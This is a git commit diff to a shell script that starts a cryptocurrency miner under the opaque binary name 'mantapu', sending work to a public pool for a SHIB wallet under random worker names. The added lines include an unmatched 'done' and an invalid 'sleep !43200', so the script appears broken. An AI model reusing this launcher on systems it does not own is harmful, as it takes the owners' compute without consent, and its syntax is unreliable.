9989b77d4685a381b9bc6db1900a93257620b30c
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-08-05 21:45:14 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -4,4 +4,6 @@ POOL=rx-us.unmineable.com:3333
 WALLET=SHIB:0xae4fa9f4582afc88f329b862738c8c50e5268fba
 WORKER=$(echo $(shuf -i 1-99999 -n 1)-xroc)
 chmod +x mantapu
-./mantapu --algo wrkzcoin --pool $POOL --user $WALLET.$WORKER
+./mantapu --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin 
+done
+sleep !43200
